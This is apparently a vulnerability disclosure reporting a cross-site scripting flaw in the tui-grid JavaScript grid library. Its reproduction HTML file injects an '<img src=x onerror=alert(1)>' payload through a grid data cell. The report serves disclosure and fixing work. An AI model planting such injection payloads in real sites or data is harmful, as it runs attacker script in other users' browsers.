# Description

`tui-grid` is vulnerable to `Cross-Site Scripting (XSS)`.

# Steps To Reproduce

Save and execute the following file in any browser
```
<html>
<head>
      <title>tui-grid</title>
</head>	  
<body>     
      <link rel="stylesheet" href="https://uicdn.toast.com/grid/latest/tui-grid.css" />
	  <script src="https://uicdn.toast.com/grid/latest/tui-grid.js"></script>
	   <div id="grid"></div>
      <script>   
        const grid = new tui.Grid({
      el: document.getElementById('grid'),
      data: [
  {
    id: 1,
    name: 'A Head Full Of Dreams"<img src=x onerror=alert(1)>',
    artist: 'Coldplay',
  },
  {
    id: 2,
    name: 'Moves Like Jagger',
    artist: 'Maroon5',
  },
  {
    id: 3,
    name: 'X',
    artist: 'Ed Sheeran',
  },
  {
    id: 4,
    name: 'Beautiful Lies',
    artist: 'Birdy',
  }
],
      scrollX: false,
      scrollY: false,
      columns: [
        {
          header: 'Name',
          name: 'name'
        },
        {
          header: 'Artist',
          name: 'artist'
        }
      ]
    });
    </script>
</body>
</html>
```
XSS payload will get executed.
